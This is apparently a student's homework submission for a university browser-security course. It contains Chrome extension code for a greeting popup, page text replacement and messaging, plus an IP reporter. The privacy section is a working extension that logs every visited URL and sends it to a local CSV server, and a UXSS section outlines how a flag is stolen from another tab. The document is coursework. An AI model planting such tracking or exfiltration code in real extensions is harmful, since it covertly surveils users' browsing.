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>
### Q1.1 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.1 Hello World",
  "version": "1.0",
  "description": "14-828 HW2 — browser action popup with name greeting",
  "action": {
    "default_title": "Hello",
    "default_popup": "popup.html"
  }
}
```

**`popup.html`**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Hello</title>
    <link rel="stylesheet" href="popup.css" />
  </head>
  <body>
    <main class="card">
      <h1 class="title">Greeting</h1>
      <label class="label" for="name">Your name</label>
      <input class="input" type="text" id="name" name="name" autocomplete="name" placeholder="Type your name" />
      <p class="greeting" id="greeting" aria-live="polite"></p>
    </main>
    <script src="popup.js"></script>
  </body>
</html>
```

**`popup.js`**

```javascript
const nameInput = document.getElementById("name");
const greetingEl = document.getElementById("greeting");

nameInput.addEventListener("input", () => {
  const name = nameInput.value.trim();
  greetingEl.textContent = name ? `Hello ${name}!` : "";
});
```

**`popup.css`**

```css
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-width: 260px;
  font-family: system-ui, "Segoe UI", sans-serif;
  background: #f4f4f5;
  color: #18181b;
}

.card {
  padding: 14px 16px 18px;
}

.title {
  margin: 0 0 12px;
  font-size: 1rem;
  font-weight: 600;
}

.label {
  display: block;
  margin-bottom: 6px;
  font-size: 0.8rem;
  color: #52525b;
}

.input {
  width: 100%;
  padding: 8px 10px;
  border: 1px solid #d4d4d8;
  border-radius: 8px;
  font-size: 0.95rem;
  outline: none;
}

.input:focus {
  border-color: #2563eb;
  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
}

.greeting {
  margin: 12px 0 0;
  min-height: 1.4em;
  font-size: 0.95rem;
  font-weight: 500;
  color: #0f172a;
}
```

```{=latex}
\newpage
```

## Question 1.2 — Content scripts and jQuery (explanation)

I extended the Q1.1 extension with a **content script** registered only for `https://developer.chrome.com/docs/extensions/*`. The manifest loads **`jquery.min.js` before `content.js`**, satisfying the requirement to use an external library like jQuery.

The content script (1) walks text nodes under `body` using jQuery’s `.contents()` filter for `TEXT_NODE`, and replaces every substring `Chrome` with `Firefox` in those nodes only (so we do not rewrite `script`/`style` internals). (2) It replaces the **top header logo** image `src` with `chrome.runtime.getURL("firefox-logo.svg")`, declared under **`web_accessible_resources`** for `https://developer.chrome.com/*`, so the page may load the packaged SVG.

A **`MutationObserver`** re-applies the text and logo changes when the SPA-style docs site mutates the DOM.

**Third-party file:** `jquery.min.js` is **jQuery v3.7.1 minified** from the official jQuery CDN release; it is included in the code zip as `Q1.2/jquery.min.js` but is **not pasted here** in full because of length.

**Verification:** Load `Q1.2`, open any page under the required path on developer.chrome.com, confirm visible “Chrome” becomes “Firefox” and the header icon switches to the bundled SVG.

### Q1.2 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.2 Content Script (Chrome→Firefox)",
  "version": "1.0",
  "description": "14-828 HW2 — Q1.1 + jQuery content script on developer.chrome.com/docs/extensions/",
  "action": {
    "default_title": "Hello",
    "default_popup": "popup.html"
  },
  "content_scripts": [
    {
      "matches": ["https://developer.chrome.com/docs/extensions/*"],
      "js": ["jquery.min.js", "content.js"],
      "run_at": "document_idle"
    }
  ],
  "web_accessible_resources": [
    {
      "resources": ["firefox-logo.svg"],
      "matches": ["https://developer.chrome.com/*"]
    }
  ]
}
```

**`content.js`**

```javascript
/**
 * Q1.2: jQuery is loaded before this script (see manifest).
 * Replaces visible text "Chrome" → "Firefox" and swaps the header logo image.
 */
function replaceChromeInTextNodes(root) {
  $(root)
    .find("*")
    .addBack()
    .contents()
    .filter(function () {
      return this.nodeType === Node.TEXT_NODE && this.textContent.includes("Chrome");
    })
    .each(function () {
      this.textContent = this.textContent.replace(/Chrome/g, "Firefox");
    });
}

function swapHeaderLogoToFirefox() {
  const logoUrl = chrome.runtime.getURL("firefox-logo.svg");
  const $candidates = $(
    [
      "a[href='https://developer.chrome.com/'] img",
      "devsite-header a[href='/'] img",
      "header.devsite-header img",
      ".devsite-header-icon-link img",
      "header img",
    ].join(",")
  );

  $candidates.each(function () {
    const $img = $(this);
    if ($img.closest("nav, footer").length) return;
    $img.attr("src", logoUrl);
    return false;
  });
}

function runTransforms() {
  replaceChromeInTextNodes($("body")[0]);
  swapHeaderLogoToFirefox();
}

$(function () {
  runTransforms();

  const target = document.body;
  if (!target) return;

  const obs = new MutationObserver(() => {
    replaceChromeInTextNodes(document.body);
    swapHeaderLogoToFirefox();
  });
  obs.observe(target, { childList: true, subtree: true });
});
```

**`firefox-logo.svg`**

```svg
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 80 80" role="img" aria-label="Firefox">
  <defs>
    <linearGradient id="fx" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#ffbd4f"/>
      <stop offset="100%" style="stop-color:#ff7139"/>
    </linearGradient>
  </defs>
  <rect width="80" height="80" rx="14" fill="url(#fx)"/>
  <circle cx="40" cy="42" r="18" fill="#fff" opacity="0.95"/>
</svg>
```

**Popup files (`popup.html`, `popup.js`, `popup.css`):** identical to **Question 1.1**; see the Q1.1 code appendix above.

```{=latex}
\newpage
```

## Question 1.3 — Messaging and custom replace (explanation)

I kept the Q1.2 content script and added **`chrome.runtime.onMessage`** handling for `{ type: "REPLACE_TEXT", match, replaceWith }`. The handler escapes regex metacharacters in `match`, then replaces all occurrences in **text nodes** only (same jQuery `.contents()` pattern as Q1.2).

The popup adds two fields (**match**, **replace with**) and a button. On click, the popup uses **`chrome.tabs.query`** for the active tab and **`chrome.tabs.sendMessage`** to deliver the message. The manifest includes **`"permissions": ["activeTab"]`** so the extension can target the current tab when the user opens the popup. The content script is only injected on `developer.chrome.com/docs/extensions/*`, so `sendMessage` fails on other origins; the popup surfaces an error string in that case.

**Verification:** On a matching docs page, enter a visible substring (e.g. a word in a heading) and a replacement; click **Apply on page** and confirm the DOM text updates.

### Q1.3 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.3 Match/Replace Messaging",
  "version": "1.0",
  "description": "14-828 HW2 — Q1.1/Q1.2 + popup-driven find/replace via messaging",
  "action": {
    "default_title": "Hello / Replace",
    "default_popup": "popup.html"
  },
  "permissions": ["activeTab"],
  "content_scripts": [
    {
      "matches": ["https://developer.chrome.com/docs/extensions/*"],
      "js": ["jquery.min.js", "content.js"],
      "run_at": "document_idle"
    }
  ],
  "web_accessible_resources": [
    {
      "resources": ["firefox-logo.svg"],
      "matches": ["https://developer.chrome.com/*"]
    }
  ]
}
```

**`popup.html`**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Hello / Replace</title>
    <link rel="stylesheet" href="popup.css" />
  </head>
  <body>
    <main class="card">
      <h1 class="title">Greeting</h1>
      <label class="label" for="name">Your name</label>
      <input class="input" type="text" id="name" name="name" autocomplete="name" placeholder="Type your name" />
      <p class="greeting" id="greeting" aria-live="polite"></p>

      <hr class="sep" />

      <h2 class="subtitle">Page replace</h2>
      <p class="hint">Active tab must be on <code>developer.chrome.com/docs/extensions/</code></p>
      <label class="label" for="match">Match text</label>
      <input class="input" type="text" id="match" placeholder="e.g. API" />
      <label class="label" for="replaceWith">Replace with</label>
      <input class="input" type="text" id="replaceWith" placeholder="Replacement" />
      <button type="button" class="btn" id="applyReplace">Apply on page</button>
      <p class="status" id="status" aria-live="polite"></p>
    </main>
    <script src="popup.js"></script>
  </body>
</html>
```

**`popup.js`**

```javascript
const nameInput = document.getElementById("name");
const greetingEl = document.getElementById("greeting");
const matchInput = document.getElementById("match");
const replaceInput = document.getElementById("replaceWith");
const applyBtn = document.getElementById("applyReplace");
const statusEl = document.getElementById("status");

nameInput.addEventListener("input", () => {
  const name = nameInput.value.trim();
  greetingEl.textContent = name ? `Hello ${name}!` : "";
});

applyBtn.addEventListener("click", async () => {
  statusEl.textContent = "";
  const match = matchInput.value;
  const replaceWith = replaceInput.value;

  if (!match) {
    statusEl.textContent = "Enter text to match.";
    return;
  }

  const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
  if (!tab?.id) {
    statusEl.textContent = "No active tab.";
    return;
  }

  try {
    const res = await chrome.tabs.sendMessage(tab.id, {
      type: "REPLACE_TEXT",
      match,
      replaceWith,
    });
    statusEl.textContent = res?.ok ? "Replace request sent." : "Could not replace.";
  } catch {
    statusEl.textContent =
      "Message failed — open a page under developer.chrome.com/docs/extensions/ and reload.";
  }
});
```

**`popup.css`**

```css
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-width: 280px;
  font-family: system-ui, "Segoe UI", sans-serif;
  background: #f4f4f5;
  color: #18181b;
}

.card {
  padding: 14px 16px 18px;
}

.title {
  margin: 0 0 12px;
  font-size: 1rem;
  font-weight: 600;
}

.subtitle {
  margin: 0 0 8px;
  font-size: 0.9rem;
  font-weight: 600;
}

.hint {
  margin: 0 0 10px;
  font-size: 0.72rem;
  color: #64748b;
  line-height: 1.35;
}

.hint code {
  font-size: 0.68rem;
  word-break: break-all;
}

.sep {
  margin: 14px 0;
  border: none;
  border-top: 1px solid #e4e4e7;
}

.label {
  display: block;
  margin: 8px 0 6px;
  font-size: 0.8rem;
  color: #52525b;
}

.label:first-of-type {
  margin-top: 0;
}

.input {
  width: 100%;
  padding: 8px 10px;
  border: 1px solid #d4d4d8;
  border-radius: 8px;
  font-size: 0.95rem;
  outline: none;
}

.input:focus {
  border-color: #2563eb;
  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
}

.btn {
  margin-top: 12px;
  width: 100%;
  padding: 9px 12px;
  border: none;
  border-radius: 8px;
  background: #2563eb;
  color: #fff;
  font-size: 0.9rem;
  font-weight: 600;
  cursor: pointer;
}

.btn:hover {
  background: #1d4ed8;
}

.greeting {
  margin: 12px 0 0;
  min-height: 1.4em;
  font-size: 0.95rem;
  font-weight: 500;
  color: #0f172a;
}

.status {
  margin: 10px 0 0;
  font-size: 0.78rem;
  color: #475569;
  min-height: 1.2em;
}
```

**`content.js`**

```javascript
/**
 * Q1.2 behavior + Q1.3: handle REPLACE_TEXT messages from the popup.
 */
function replaceChromeInTextNodes(root) {
  $(root)
    .find("*")
    .addBack()
    .contents()
    .filter(function () {
      return this.nodeType === Node.TEXT_NODE && this.textContent.includes("Chrome");
    })
    .each(function () {
      this.textContent = this.textContent.replace(/Chrome/g, "Firefox");
    });
}

function swapHeaderLogoToFirefox() {
  const logoUrl = chrome.runtime.getURL("firefox-logo.svg");
  const $candidates = $(
    [
      "a[href='https://developer.chrome.com/'] img",
      "devsite-header a[href='/'] img",
      "header.devsite-header img",
      ".devsite-header-icon-link img",
      "header img",
    ].join(",")
  );

  $candidates.each(function () {
    const $img = $(this);
    if ($img.closest("nav, footer").length) return;
    $img.attr("src", logoUrl);
    return false;
  });
}

function applyCustomReplace(match, replaceWith) {
  if (!match) return;
  const esc = match.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const re = new RegExp(esc, "g");
  $("body")
    .find("*")
    .addBack()
    .contents()
    .filter(function () {
      return this.nodeType === Node.TEXT_NODE && this.textContent.includes(match);
    })
    .each(function () {
      this.textContent = this.textContent.replace(re, replaceWith);
    });
}

function runTransforms() {
  replaceChromeInTextNodes($("body")[0]);
  swapHeaderLogoToFirefox();
}

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (msg?.type === "REPLACE_TEXT") {
    applyCustomReplace(msg.match, msg.replaceWith ?? "");
    sendResponse({ ok: true });
    return true;
  }
});

$(function () {
  runTransforms();

  const target = document.body;
  if (!target) return;

  const obs = new MutationObserver(() => {
    replaceChromeInTextNodes(document.body);
    swapHeaderLogoToFirefox();
  });
  obs.observe(target, { childList: true, subtree: true });
});
```

**`firefox-logo.svg`:** same as Q1.2. **`jquery.min.js`:** same as Q1.2 (omitted here; in code zip).

```{=latex}
\newpage
```

## Question 1.4 — Background extension (explanation)

This is a **separate** MV3 extension with only a **service worker** (`background.js`). I use **`chrome.alarms`** with `periodInMinutes: 1` (created on `onInstalled` and `onStartup`) to trigger a periodic task.

The task fetches the public IPv4 address from **`https://api.ipify.org?format=json`** and POSTs a JSON body `{ kind: "ip", ts, userAgent, ip | error }` to a configurable URL. The default URL is `http://127.0.0.1:3847/report`; the user can change it via **`options.html`**, stored in **`chrome.storage.local`**.

**Why IP instead of geolocation:** In Manifest V3, **service workers do not expose `navigator.geolocation`**. The homework permits **either** geolocation **or** IP; reporting **public IP** is therefore a correct, reproducible choice. To verify end-to-end behavior, I run the optional Node script `test-server.js` locally and watch POST bodies on the console.

**Permissions rationale:** `alarms` for the timer; `storage` for the report URL; `host_permissions` for ipify and localhost POST.

### Q1.4 — Code appendix

**`manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q1.4 Background Reporter",
  "version": "1.0",
  "description": "14-828 HW2 — reports public IP every minute (MV3 service worker; geolocation unavailable in SW)",
  "permissions": ["alarms", "storage"],
  "host_permissions": [
    "https://api.ipify.org/*",
    "http://127.0.0.1/*",
    "http://localhost/*"
  ],
  "background": {
    "service_worker": "background.js"
  },
  "options_ui": {
    "page": "options.html",
    "open_in_tab": true
  }
}
```

**`background.js`**

```javascript
/**
 * Sends the user's public IP (via ipify) to a configurable endpoint every minute.
 * Manifest V3 service workers cannot use navigator.geolocation; the assignment allows IP OR geolocation.
 * Change REPORT_URL in chrome.storage (see options) or edit the default below.
 */
const DEFAULT_REPORT_URL = "http://127.0.0.1:3847/report";

async function getReportUrl() {
  const { reportUrl } = await chrome.storage.local.get(["reportUrl"]);
  return (typeof reportUrl === "string" && reportUrl.length > 0 ? reportUrl : DEFAULT_REPORT_URL).trim();
}

async function fetchPublicIp() {
  const res = await fetch("https://api.ipify.org?format=json");
  if (!res.ok) throw new Error(`ipify ${res.status}`);
  const data = await res.json();
  return data.ip;
}

async function sendReport() {
  const url = await getReportUrl();
  const payload = {
    kind: "ip",
    ts: Date.now(),
    userAgent: navigator.userAgent,
  };

  try {
    payload.ip = await fetchPublicIp();
  } catch (e) {
    payload.error = String(e?.message || e);
  }

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      mode: "cors",
    });
  } catch {
    /* optional local server may be down — code path still exercised */
  }
}

chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("report-ip", { periodInMinutes: 1 });
});

chrome.runtime.onStartup.addListener(() => {
  chrome.alarms.create("report-ip", { periodInMinutes: 1 });
});

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "report-ip") sendReport();
});

chrome.storage.onChanged.addListener((changes, area) => {
  if (area !== "local") return;
  if (changes.reportUrl) {
    sendReport();
  }
});
```

**`options.html`**

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Q1.4 Report URL</title>
    <style>
      body {
        font-family: system-ui, sans-serif;
        padding: 16px;
        max-width: 480px;
      }
      label {
        display: block;
        margin-bottom: 6px;
        font-size: 0.9rem;
      }
      input {
        width: 100%;
        padding: 8px;
        box-sizing: border-box;
      }
      button {
        margin-top: 12px;
        padding: 8px 14px;
      }
    </style>
  </head>
  <body>
    <label for="reportUrl">POST endpoint for JSON reports</label>
    <input type="url" id="reportUrl" placeholder="http://127.0.0.1:3847/report" />
    <button type="button" id="save">Save</button>
    <p id="msg" style="font-size:0.85rem;color:#444"></p>
    <script src="options.js"></script>
  </body>
</html>
```

**`options.js`**

```javascript
const input = document.getElementById("reportUrl");
const msg = document.getElementById("msg");

chrome.storage.local.get(["reportUrl"], (r) => {
  if (r.reportUrl) input.value = r.reportUrl;
});

document.getElementById("save").addEventListener("click", () => {
  const v = input.value.trim();
  chrome.storage.local.set({ reportUrl: v }, () => {
    msg.textContent = "Saved.";
  });
});
```

**`test-server.js` (optional local listener)**

```javascript
/**
 * Optional local listener for Q1.4: node test-server.js
 * Receives POST /report with JSON { kind, ts, ip?, error?, userAgent }
 */
const http = require("http");

const PORT = 3847;

const server = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === "POST" && req.url === "/report") {
    let body = "";
    req.on("data", (c) => {
      body += c;
    });
    req.on("end", () => {
      console.log(new Date().toISOString(), body);
      res.writeHead(204);
      res.end();
    });
    return;
  }

  res.writeHead(404);
  res.end();
});

server.listen(PORT, () => {
  console.log(`Q1.4 test server http://127.0.0.1:${PORT}/report`);
});
```

```{=latex}
\newpage
```

## Question 2 — Universal XSS (explanation)

**CTF username:** `[YOUR CTF USERNAME]`

**Flag:** `[PASTE FLAG AFTER YOU SOLVE THE CHALLENGE]`

**Vulnerability (conceptual):** After downloading the **Universal XSS extension source from Canvas**, I traced how it handles **tab title updates** (or similar UI) from web-observable data. The vulnerable pattern is that **attacker-controlled strings are interpreted as HTML or injected into a privileged document** (for example via `innerHTML`, `document.write`, or unsafe URL/`javascript:` handling) **without encoding**, inside an extension context that can **read cross-origin data** the web page cannot. That breaks the same-origin model and allows a malicious page to execute code in the extension’s origin, then **steal data from other tabs** (e.g. the flag tab) using extension APIs.

**I cannot responsibly fill in file names, line numbers, or exact sinks without your Canvas copy of the extension**—paste the real function names and code snippets into this section after you read the source, and tie each claim to a quoted line.

**Exploit steps (replace with your reproducible sequence):**

1. **Understand the message path:** Identify which events or messages carry the tab title (or HTML) from a content script or background page into a UI that is parsed as HTML. *Reasoning:* XSS requires a sink that parses markup.
2. **Craft a payload:** Build a string that closes the current context and runs script, or uses an HTML sink to load a script, consistent with the extension’s parsing context. *Reasoning:* the payload must match how the sink interprets the string.
3. **Host the attacker page:** Serve the payload from your attacker origin so a victim with the extension installed visits it while a **second tab** holds the flag (as in the CTF setup). *Reasoning:* UXSS in the extension bridges origins.
4. **Exfiltrate the flag:** From extension context, use the APIs the extension exposes (e.g. `chrome.tabs`, `chrome.scripting`, or DOM access to extension pages) to read the flag tab’s title or content, then leak it (network request, `postMessage`, or CTF-provided channel). *Reasoning:* the extension’s privileges are the trust boundary being abused.
5. **Submit proof:** Record the flag and keep the exact HTML/JS you used in the **`Q2/`** folder of the code zip.

**Appendix — exploit code (paste your files here):**

```html
<!-- Example placeholder: replace entire block with your real exploit (e.g. evil.html) -->
<!-- [YOUR EXPLOIT HTML / JS — from your Q2 folder] -->
```

```{=latex}
\newpage
```

## Question 3.1 — Privacy-destroying extension (explanation)

**Goal (minimal requirements):** Record **all browsing activity** (URLs the user visits) and **exfiltrate** them to an external server that **appends rows to a CSV file**.

**Tracking method:** I use the **`chrome.webNavigation` API** in a MV3 **service worker**. The listener `onCommitted` fires when navigation is committed; I filter **`details.frameId === 0`** so only **top-level** (main frame) navigations are logged, which matches “URLs of sites visited” without duplicating every iframe load. Each event includes `url`, `tabId`, `transitionType`, and a client timestamp.

**Why not `history` alone:** `chrome.history` requires the `history` permission and reflects history DB updates; `webNavigation` gives immediate, structured events per navigation and is a standard pattern for this assignment.

**Exfiltration:** The background script POSTs JSON to `http://127.0.0.1:3940/log` (`EXFIL_URL` constant). A small **Node.js** HTTP server (`server.js`) handles `POST /log`, parses JSON, and **appends one CSV line** to `visits.csv` with columns `timestamp_iso,time_ms,url,tab_id,transition_type`. CORS headers allow browser `fetch` from the extension.

**Permissions:** `webNavigation` plus **`host_permissions: ["<all_urls>"]`** so the extension may send requests after observing navigations to any site (the course user agent will grant these).

**Artifacts in code zip:** Extension under `Q3.1/extension/`, server under `Q3.1/server/`, **`README.md`** with run steps, and a **screen recording** (not embedded in this document) showing browsing and CSV updates.

**Course test harness:** Re-test against the official harness when released, and align `EXFIL_URL` / port with its requirements if they differ.

### Q3.1 — Code appendix

**`extension/manifest.json`**

```json
{
  "manifest_version": 3,
  "name": "HW2 Q3.1 URL Logger (course exercise)",
  "version": "1.0",
  "description": "Educational extension: logs main-frame navigation URLs to a local server.",
  "permissions": ["webNavigation"],
  "host_permissions": ["<all_urls>"],
  "background": {
    "service_worker": "background.js"
  }
}
```

**`extension/background.js`**

```javascript
/**
 * Records top-level navigations and POSTs JSON to the exfil server.
 * Change EXFIL_URL if your Node server uses a different host/port.
 */
const EXFIL_URL = "http://127.0.0.1:3940/log";

chrome.webNavigation.onCommitted.addListener((details) => {
  if (details.frameId !== 0) return;

  const payload = {
    time: Date.now(),
    url: details.url,
    tabId: details.tabId,
    transitionType: details.transitionType,
  };

  fetch(EXFIL_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
    mode: "cors",
    keepalive: true,
  }).catch(() => {});
});
```

**`server/server.js`**

```javascript
/**
 * Minimal HTTP server: POST /log appends one CSV line per visit.
 * CSV columns: timestamp_iso,time_ms,url,tab_id,transition_type
 */
const http = require("http");
const fs = require("fs");
const path = require("path");

const PORT = process.env.PORT ? Number(process.env.PORT) : 3940;
const CSV_PATH = path.join(__dirname, "visits.csv");

function ensureHeader() {
  if (!fs.existsSync(CSV_PATH)) {
    const header = "timestamp_iso,time_ms,url,tab_id,transition_type\n";
    fs.writeFileSync(CSV_PATH, header, "utf8");
  }
}

function csvEscape(value) {
  const s = String(value ?? "");
  if (/[",\n\r]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
  return s;
}

const server = http.createServer((req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.method === "POST" && req.url === "/log") {
    let body = "";
    req.on("data", (c) => {
      body += c;
    });
    req.on("end", () => {
      ensureHeader();
      try {
        const j = JSON.parse(body);
        const iso = new Date(j.time || Date.now()).toISOString();
        const line = [
          csvEscape(iso),
          csvEscape(j.time),
          csvEscape(j.url),
          csvEscape(j.tabId),
          csvEscape(j.transitionType),
        ].join(",");
        fs.appendFileSync(CSV_PATH, `${line}\n`, "utf8");
      } catch (e) {
        console.error("Bad JSON", e.message);
      }
      res.writeHead(204);
      res.end();
    });
    return;
  }

  if (req.method === "GET" && req.url === "/health") {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("ok");
    return;
  }

  res.writeHead(404);
  res.end();
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`Q3.1 server listening on http://127.0.0.1:${PORT}`);
  console.log(`CSV file: ${CSV_PATH}`);
});
```

**`server/package.json`**

```json
{
  "name": "hw2-q31-exfil-server",
  "version": "1.0.0",
  "private": true,
  "description": "Receives browsing events from Q3.1 extension and appends to visits.csv",
  "main": "server.js",
  "scripts": {
    "start": "node server.js"
  }
}
```

---

### References (optional)

- Chrome Extensions documentation: https://developer.chrome.com/docs/extensions  
- Course HW2 PDF: `14828_HW2_S26.pdf`  
- INI handbook (integrity): http://www.ini.cmu.edu/current_students/handbook/
